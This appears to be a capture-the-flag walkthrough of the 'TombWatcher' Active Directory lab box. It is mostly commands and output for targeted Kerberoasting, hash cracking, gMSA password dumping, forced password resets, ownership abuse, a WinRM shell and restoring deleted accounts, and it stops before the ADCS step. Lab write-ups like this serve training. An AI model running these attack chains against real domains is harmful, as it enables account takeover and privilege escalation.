
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!
## NMAP SCAN 
```
nmap -sSCV -p- 10.129.204.168                               
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-28 17:57 +0700
Nmap scan report for 10.129.204.168
Host is up (0.080s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-28 09:30:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-28T09:32:00+00:00; -1h30m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-04-28T09:32:00+00:00; -1h30m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-04-28T09:32:00+00:00; -1h30m03s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-28T09:32:00+00:00; -1h30m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
49755/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-28T09:31:22
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1h30m02s, deviation: 0s, median: -1h30m03s
```

```
smbclient -L //10.129.204.168/ -U 'henry%H3nry_987TGV!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.204.168 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

nothing usefull.... 
```
impacket-lookupsid henry@10.129.204.168                                                                   
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.204.168
[*] StringBinding ncacn_np:10.129.204.168[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1392491010-1358638721-2126982587
498: TOMBWATCHER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: TOMBWATCHER\Administrator (SidTypeUser)
501: TOMBWATCHER\Guest (SidTypeUser)
502: TOMBWATCHER\krbtgt (SidTypeUser)
512: TOMBWATCHER\Domain Admins (SidTypeGroup)
513: TOMBWATCHER\Domain Users (SidTypeGroup)
514: TOMBWATCHER\Domain Guests (SidTypeGroup)
515: TOMBWATCHER\Domain Computers (SidTypeGroup)
516: TOMBWATCHER\Domain Controllers (SidTypeGroup)
517: TOMBWATCHER\Cert Publishers (SidTypeAlias)
518: TOMBWATCHER\Schema Admins (SidTypeGroup)
519: TOMBWATCHER\Enterprise Admins (SidTypeGroup)
520: TOMBWATCHER\Group Policy Creator Owners (SidTypeGroup)
521: TOMBWATCHER\Read-only Domain Controllers (SidTypeGroup)
522: TOMBWATCHER\Cloneable Domain Controllers (SidTypeGroup)
525: TOMBWATCHER\Protected Users (SidTypeGroup)
526: TOMBWATCHER\Key Admins (SidTypeGroup)
527: TOMBWATCHER\Enterprise Key Admins (SidTypeGroup)
553: TOMBWATCHER\RAS and IAS Servers (SidTypeAlias)
571: TOMBWATCHER\Allowed RODC Password Replication Group (SidTypeAlias)
572: TOMBWATCHER\Denied RODC Password Replication Group (SidTypeAlias)
1000: TOMBWATCHER\DC01$ (SidTypeUser)
1101: TOMBWATCHER\DnsAdmins (SidTypeAlias)
1102: TOMBWATCHER\DnsUpdateProxy (SidTypeGroup)
1103: TOMBWATCHER\Henry (SidTypeUser)
1104: TOMBWATCHER\Alfred (SidTypeUser)
1105: TOMBWATCHER\sam (SidTypeUser)
1106: TOMBWATCHER\john (SidTypeUser)
1107: TOMBWATCHER\Infrastructure (SidTypeGroup)
1108: TOMBWATCHER\ansible_dev$ (SidTypeUser)


pcclient -U 'henry%H3nry_987TGV!' 10.129.204.168
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Henry] rid:[0x44f]
user:[Alfred] rid:[0x450]
user:[sam] rid:[0x451]
user:[john] rid:[0x452]
```

```
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.129.204.168 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::c381:5e0b:5eae:f14f
INFO: Trying LDAP connection to dead:beef::c381:5e0b:5eae:f14f
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::c381:5e0b:5eae:f14f
INFO: Trying LDAP connection to dead:beef::c381:5e0b:5eae:f14f
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 29S
INFO: Compressing output into 20260428164222_bloodhound.zip
```

got the bloodhound now lets look for the attack path...

ok so henry has WriteSPN over alfred so we can add a fake SPN to let kerberos let us get the TGS

```
bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host 10.129.204.168 set object alfred servicePrincipalName -v 'fake/roast' 
[+] alfred's servicePrincipalName has been updated

```
```
impacket-GetUserSPNs 'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip 10.129.204.168 -request                       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  ------  --------  --------------------------  ---------  ----------
fake/roast            Alfred            2025-05-12 22:17:03.526670  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3affb23df9238afdc80090170932c5e6$0acf9f7a31f434785ed002b78a3263d794384d4539ed83e50596ea562abafa25e4eeb036d9226016726aad097fef93fa1ffba1612a266cfd54b9f633509969d8e4c13f00f5433b35871be039b6c781e54e844f937a7902f8aa9a3fa37a77fb0ae2a81c22511baf34d8841ce646b8fda44dd28b0c68b53a0e6133ee89374728f05d777f078a66b37ffda6b9238b8189e08ac6c15887440b855b9ad166afc67154c3f997c27573767fc599dc978176188693258507593be96b4f82608bc63ae8e2f774cb1eea5af7a7d00a83dc1689d75b1afbabf40bab6056b4f5bf61247695241254f666a122bb23477788ac53b6da5c389d9338e9f583fa44629189d86804baed3dcd3bf46808ec4a15bc6d5ceba910edd4a181485645c1958b226b79f1425dd673c65698a24902a1029a54c509d81639425527d94430d1576d2853dafb8ff27972889385eaa209330650c21d863eeaf7d1c480e27c7aa74ec55c18ad9bd201b88caf777a7afe0956725f1c4c9cd4502bc60b6bf7045798ddc2f572eabc3257046edcc8a465841cd08cb43479d66620cd7fa34653e9f63cd10ca4d2eb8cc7c770c2fdccdd59713e852d90ba6faf2396d224645a296561d2a401ce7f38cbce95a4583431ac81f2c2e519d4cf20a370274d0d96c50f4079866637ba780f7dd7067892a92ed6656584d928fa8edbf0b5d58f1d8933bd5383b11c72c1f180edca87603c714f97d8942ba2af1031cc22ce5045924e2194b2b9c7dce7604864df36a0939118554230ea916b59dd8bef9c7c933450be250c3fd8ee9066d03c4bca94884740ff66bae69869cd586bbbceac39acffdefd6d5c54ab63bbc9327dc2c7e6c68512f91cf488903a33d2acfed6a1fd5f4fc50ba55e45f318203e47b3788d3c706bff9a58fe7678a8b368ebcdb88f17b6d4902ba189aec12ce1ac307926e06167fe6fff67b0bf16ded667ed1a22b7cd537ebe5f36fff9d836223536245ac3d1da9ea8cc2864d74ea866d748836a8f7415e817bb9ff68018e10d64b6d907a75bc51795511045a26de628ab3f77f20737110162e3cb53425f1c72e31fc5e028b6acf3c4e354cff31d9a388e140f67ef98e1fe552c1186745d2f63b13a6126c2e920c8d922abf88af5518a07b220a7ad5c6140cff0f9df7ed0837a1c7994066bff7f8223da8046e8878aaaa54c25eb2376eeedab7271d1ed2a9990915575143ba7adefb3927ca59b27e21b1531c04d54e14fa08e6d830600ed3b0cbf1a7d98a3b2cd06c27b6b56f4dce92b1ce6a2fa001200d11f259392abfd75cbfccbfef713b78e1ee39e1f91b8bb986799b9ada17112a48e39a28ace55389eb2f8048b9189b7dc8cb93539fd53a0743809d2216a1ff243b35299b1bea8b4fd2a3df97f6bbcc6a1a968a116864694585f27f11eb525c0cbeb97533de3f72fcf36714ceecc02eae052e1715f1c9074361d83f2bb2c1ae31dc5cb4e310e
```

got the pass.... 
```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3affb23df9238afdc80090170932c5e6$0acf9f7a31f434785ed002b78a3263d794384d4539ed83e50596ea562abafa25e4eeb036d9226016726aad097fef93fa1ffba1612a266cfd54b9f633509969d8e4c13f00f5433b35871be039b6c781e54e844f937a7902f8aa9a3fa37a77fb0ae2a81c22511baf34d8841ce646b8fda44dd28b0c68b53a0e6133ee89374728f05d777f078a66b37ffda6b9238b8189e08ac6c15887440b855b9ad166afc67154c3f997c27573767fc599dc978176188693258507593be96b4f82608bc63ae8e2f774cb1eea5af7a7d00a83dc1689d75b1afbabf40bab6056b4f5bf61247695241254f666a122bb23477788ac53b6da5c389d9338e9f583fa44629189d86804baed3dcd3bf46808ec4a15bc6d5ceba910edd4a181485645c1958b226b79f1425dd673c65698a24902a1029a54c509d81639425527d94430d1576d2853dafb8ff27972889385eaa209330650c21d863eeaf7d1c480e27c7aa74ec55c18ad9bd201b88caf777a7afe0956725f1c4c9cd4502bc60b6bf7045798ddc2f572eabc3257046edcc8a465841cd08cb43479d66620cd7fa34653e9f63cd10ca4d2eb8cc7c770c2fdccdd59713e852d90ba6faf2396d224645a296561d2a401ce7f38cbce95a4583431ac81f2c2e519d4cf20a370274d0d96c50f4079866637ba780f7dd7067892a92ed6656584d928fa8edbf0b5d58f1d8933bd5383b11c72c1f180edca87603c714f97d8942ba2af1031cc22ce5045924e2194b2b9c7dce7604864df36a0939118554230ea916b59dd8bef9c7c933450be250c3fd8ee9066d03c4bca94884740ff66bae69869cd586bbbceac39acffdefd6d5c54ab63bbc9327dc2c7e6c68512f91cf488903a33d2acfed6a1fd5f4fc50ba55e45f318203e47b3788d3c706bff9a58fe7678a8b368ebcdb88f17b6d4902ba189aec12ce1ac307926e06167fe6fff67b0bf16ded667ed1a22b7cd537ebe5f36fff9d836223536245ac3d1da9ea8cc2864d74ea866d748836a8f7415e817bb9ff68018e10d64b6d907a75bc51795511045a26de628ab3f77f20737110162e3cb53425f1c72e31fc5e028b6acf3c4e354cff31d9a388e140f67ef98e1fe552c1186745d2f63b13a6126c2e920c8d922abf88af5518a07b220a7ad5c6140cff0f9df7ed0837a1c7994066bff7f8223da8046e8878aaaa54c25eb2376eeedab7271d1ed2a9990915575143ba7adefb3927ca59b27e21b1531c04d54e14fa08e6d830600ed3b0cbf1a7d98a3b2cd06c27b6b56f4dce92b1ce6a2fa001200d11f259392abfd75cbfccbfef713b78e1ee39e1f91b8bb986799b9ada17112a48e39a28ace55389eb2f8048b9189b7dc8cb93539fd53a0743809d2216a1ff243b35299b1bea8b4fd2a3df97f6bbcc6a1a968a116864694585f27f11eb525c0cbeb97533de3f72fcf36714ceecc02eae052e1715f1c9074361d83f2bb2c1ae31dc5cb4e310e:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...4e310e
Time.Started.....: Tue Apr 28 17:01:43 2026 (0 secs)
Time.Estimated...: Tue Apr 28 17:01:43 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   713.1 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> babygrl
Hardware.Mon.#01.: Util: 18%
```

alfred:basketball

so alfred can add himself to infrastructure group which has readgMSApassword over ANSIBLEDEV
```
bloodyAD --host "10.129.204.168" -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember Infrastructure Alfred
[+] Alfred added to Infrastructure
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/micahvandeusen/gMSADumper                                                         
Cloning into 'gMSADumper'...
remote: Enumerating objects: 54, done.
remote: Counting objects: 100% (54/54), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 54 (delta 22), reused 38 (delta 14), pack-reused 0 (from 0)
Receiving objects: 100% (54/54), 38.35 KiB | 801.00 KiB/s, done.
Resolving deltas: 100% (22/22), done.
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cd gMSADumper             
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/gMSADumper]
└─$ ls
COPYING  gMSADumper.py  __init__.py  README.md  requirements.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/gMSADumper]
└─$ python3 gMSADumper.py -d "tombwatcher.htb" -u "alfred" -p "basketball" -l "10.129.204.168"                                              

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7e792e4c14e4040a0b4f18235a6afe55
ansible_dev$:aes256-cts-hmac-sha1-96:a025758863121a7fe489ba640da9d1d37ac85ff6c0547bff0f25bc0cb25bf649
ansible_dev$:aes128-cts-hmac-sha1-96:f43746eee24abcf409d2f3c798563bde
```

```
nxc smb 10.129.204.168 -u 'ansible_dev$' -H 7e792e4c14e4040a0b4f18235a6afe55

SMB         10.129.204.168  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.204.168  445    DC01             [+] tombwatcher.htb\ansible_dev$:7e792e4c14e4040a0b4f18235a6afe55
```

ok so we have NTLM hash of ansible_dev$
so now ansible_dev$ has force change password on sam 
then sam has writeowner on john who is in remote management group, so we can get user flag...

```
bloodyAD --host 10.129.204.168 -d tombwatcher.htb -u 'ansible_dev$' -p :7e792e4c14e4040a0b4f18235a6afe55 set password sam 'Password123!'

[+] Password changed successfully!
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.204.168 -u sam -p 'Password123!'                             
SMB         10.129.204.168  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.204.168  445    DC01             [+] tombwatcher.htb\sam:Password123! 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.204.168 -d tombwatcher.htb -u sam -p 'Password123!' set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```
```
bloodyAD --host 10.129.204.168 -d tombwatcher.htb -u sam -p 'Password123!' add genericAll john sam
[+] sam has now GenericAll on john
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.204.168 -d tombwatcher.htb -u sam -p 'Password123!' set object john servicePrincipalName -v 'fake/john'

[+] john's servicePrincipalName has been updated
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.204.168 -d tombwatcher.htb -u sam -p 'Password123!' set object john servicePrincipalName -v 'fake/john'

[+] john's servicePrincipalName has been updated
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-GetUserSPNs 'tombwatcher.htb/sam:Password123!' -dc-ip 10.129.204.168 -request-user john -request -outputfile john_hash.txt

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name  MemberOf                                                     PasswordLastSet             LastLogon  Delegation 
--------------------  ----  -----------------------------------------------------------  --------------------------  ---------  ----------
fake/john             john  CN=Remote Management Users,CN=Builtin,DC=tombwatcher,DC=htb  2025-05-19 20:25:10.754209  <never>               



[-] CCache file is not found. Skipping...
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls
 Desktop   Documents   Downloads   exploits   gMSADumper   hashes.txt  'HTB BOXES'   john_hash.txt   Music   Pictures   Public   Templates   Videos   winPEASany.exe
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat john_hash.txt          
$krb5tgs$23$*john$TOMBWATCHER.HTB$tombwatcher.htb/john*$c76fc39bc11e68141c2a9bd7f2a31c68$baef3da02c8c2478f4c289176eea6fc127c42593119d3426200b060747ad0037aae1d29cca101b6d6a683fb7dc3f0edc7a452b18731fa19b289b6c3f7445d5697681bf6c19c437fb059e1c5795c487f53316d7ceabad1dc00aadd7652a8011ecb74e4319065c11fe2d7bdfc797f2891afe18a4b1299789c6de7ebe06ac933d1e3db7da6c15baa53eeda593ae36c8aee2d36b9f76c72f223b6b3427eeeb282190c699055ccc339aa42216edcaca5ee66271b3849374437ca6f005d164d6f161ee6a8faf4990e639ff56391acf1f7665999151a2a1e3c9a605c7a9a7676b95f4959575909a2dde6a3422fdc998d08f6bd079fda9f22c12cc1212c5964a019c0aa43e7183606318147c29a657696896ad664d2eb24bd8855f20fb69abf098d32137202d64a4ccff0f21dcb90ce7bcc96a75dd63bacf98d3c9b35c0bb1f41e8ec3a4811e44241c0cb1341f1f8a22ef0ca64898cb36e9298af50f8234f184183c44244103630f6b3749c346e0c72c2ec7bd557e142b864072e229527f64891a0f2c65f97016695606b20a225d16e2a96022f37aa6354e9aaa0022233f4d1e1667c69470dccc1bebbcf28b7d0ac0579050ffaa6f1e67b19c3abc5a5f9f0d5594af789141ad020a54873962c280b3be4f7b8f4e32ff149c696a1cb91ee3539e633e3c3e4572f7fe3ecce28d93599204f85619aa848c00bf77eb5825a7c38db282d8cb9165faa37f694c0b9bf803b56a673e5af7ca55f2ee119777adbbe4566730b3337f4a01e92b349d4a9264d97b0cefe2bd5be82dbf8abaec106bba38f1d6cbafbb6b73027541371fa975f03326880ab05dc9f7c6bc91eb9d2e442e78138b4e81c71b141024e8e8284567dfed7352ab50f6d572a09ae895b5f7bf4363c4a1af8f0a4adb9abf0f265c7e40144ae2418300f911d0478c2c1dfc595fbf8aa023c271363c05e0443eb2727f1a87cffbf8d181a3985cc2254603817d678da64b271a88a1ac521c14ba85a13dea1cf6dc45ba7b630a49980087528fc7164fecad96c5ff77c496d2e3763b4a4652dbd40233bf8b954563c175066acef926acf4065aea0a194a18a7dd7a1b29a013da25a709b4e844f16880a06bd537ca9d380e22a90fd0d90c628a091bd3f9643ba2a3b465b0501e504cad8986bf412a8a13bd1490275121289ea6102a96a5182109650435791eac16d56994a5c1125f5e70325ecd81369ea79892dfcc0433345572980c6a3dcecf0eb5c2c879178b29196b8da9855743f730b0c51a044bb9c748e87573c4c25f6bb168d523d949c0f273622f0bcddd70aa21d1945f7c7c9aa929ca29ab986f6616b31836a750c9ca7faaa3632fcb047524e2eb224e236339cbd3f7637ae66a881acfdd66c6e848fa91de1b676930424c92f1fe2fd911060df0527690cd5f36cd47a0237147
```

got tgs for john lets crack it
the hash is uncrackable so have to change the pass 
```
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d tombwatcher.htb -u 'sam' -p 'Password123!' --host 10.129.204.168 set owner john sam

[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d tombwatcher.htb -u 'sam' -p 'Password123!' --host 10.129.204.168 add genericAll john sam

[+] sam has now GenericAll on john
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ bloodyAD -d tombwatcher.htb -u 'sam' -p 'Password123!' --host 10.129.204.168 set password john 'NewPass123!'

[+] Password changed successfully!
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.204.168 -u john -p 'NewPass123!'                                   
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
fbbb640157cbd24ec5a9b201bf7e13b6
```

and got the user flag
as john we have genericall on ADCS we can exploit it to get admin 
so found a user cert_admin which was deleted and resored it.... 
```
 ldapsearch -H ldap://10.129.204.168 -x -b "CN=Deleted Objects,DC=tombwatcher,DC=htb" -D "john@tombwatcher.htb" -w 'NewPass123!' "(sAMAccountName=cert_admin*)" -E 1.2.840.113556.1.4.417

# extended LDIF
#
# LDAPv3
# base <CN=Deleted Objects,DC=tombwatcher,DC=htb> with scope subtree
# filter: (sAMAccountName=cert_admin*)
# requesting: ALL
#

# cert_admin
DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3, Deleted Objects, tombwat
 cher.htb
dn: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Object
 s,DC=tombwatcher,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn:: Y2VydF9hZG1pbgpERUw6ZjgwMzY5YzgtOTZhMi00YTdmLWE1NmMtOWMxNWVkZDdkMWUz
sn: cert_admin
givenName: cert_admin
distinguishedName: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN
 =Deleted Objects,DC=tombwatcher,DC=htb
instanceType: 4
whenCreated: 20241116005559.0Z
whenChanged: 20241116005759.0Z
uSNCreated: 12844
isDeleted: TRUE
uSNChanged: 12975
name:: Y2VydF9hZG1pbgpERUw6ZjgwMzY5YzgtOTZhMi00YTdmLWE1NmMtOWMxNWVkZDdkMWUz
objectGUID:: yGkD+KKWf0qlbJwV7dfR4w==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133761921597856970
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cert_admin
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
dSCorePropagationData: 20241116005605.0Z
dSCorePropagationData: 20241116005602.0Z
dSCorePropagationData: 16010101000001.0Z
msDS-LastKnownRDN: cert_admin

# cert_admin
DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358, Deleted Objects, tombwat
 cher.htb
dn: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Object
 s,DC=tombwatcher,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn:: Y2VydF9hZG1pbgpERUw6YzFmMWYwZmUtZGY5Yy00OTRjLWJmMDUtMDY3OWUxODFiMzU4
sn: cert_admin
givenName: cert_admin
distinguishedName: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN
 =Deleted Objects,DC=tombwatcher,DC=htb
instanceType: 4
whenCreated: 20241116170405.0Z
whenChanged: 20241116170421.0Z
uSNCreated: 13161
isDeleted: TRUE
uSNChanged: 13171
name:: Y2VydF9hZG1pbgpERUw6YzFmMWYwZmUtZGY5Yy00OTRjLWJmMDUtMDY3OWUxODFiMzU4
objectGUID:: /vDxwZzfTEm/BQZ54YGzWA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133762502455822446
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cert_admin
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
dSCorePropagationData: 20241116170418.0Z
dSCorePropagationData: 20241116170408.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-LastKnownRDN: cert_admin

# cert_admin
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf, Deleted Objects, tombwat
 cher.htb
dn: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Object
 s,DC=tombwatcher,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn:: Y2VydF9hZG1pbgpERUw6OTM4MTgyYzMtYmYwYi00MTBhLTlhYWEtNDVjOGUxYTAyZWJm
sn: cert_admin
givenName: cert_admin
distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN
 =Deleted Objects,DC=tombwatcher,DC=htb
instanceType: 4
whenCreated: 20241116170704.0Z
whenChanged: 20241116170727.0Z
uSNCreated: 13186
isDeleted: TRUE
uSNChanged: 13197
name:: Y2VydF9hZG1pbgpERUw6OTM4MTgyYzMtYmYwYi00MTBhLTlhYWEtNDVjOGUxYTAyZWJm
objectGUID:: w4KBkwu/CkGaqkXI4aAuvw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133762504248946345
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cert_admin
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb
dSCorePropagationData: 20241116170710.0Z
dSCorePropagationData: 20241116170708.0Z
dSCorePropagationData: 16010101000000.0Z
msDS-LastKnownRDN: cert_admin

```

```
*Evil-WinRM* PS C:\> Restore-ADObject -Identity "f80369c8-96a2-4a7f-a56c-9c15edd7d1e3" -TargetPath "OU=ADCS,DC=tombwatcher,DC=htb"
*Evil-WinRM* PS C:\> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'CertAdmin123!' -AsPlainText -Force) -Reset
Enable-ADAccount cert_admin
```

cert_admin has 7 SID's which means maybe we restored the wrong one... 
```
User 'CERT_ADMIN' has 6 SIDs:
[+]   S-1-5-21-1392491010-1358638721-2126982587-1109
[+]   S-1-5-21-1392491010-1358638721-2126982587-513
[+]   S-1-5-21-1392491010-1358638721-2126982587-515
[+]   S-1-5-11
[+]   S-1-1-0
[+]   S-1-5-32-545
```
from ldapsearch output lets restore the correct one and see what happens...
ok so correct one works but there is a script running which keeps restoring the accounts to old state so we have to be fast... 
as soon as we restore the account we have to run commands to get administrator.pfx
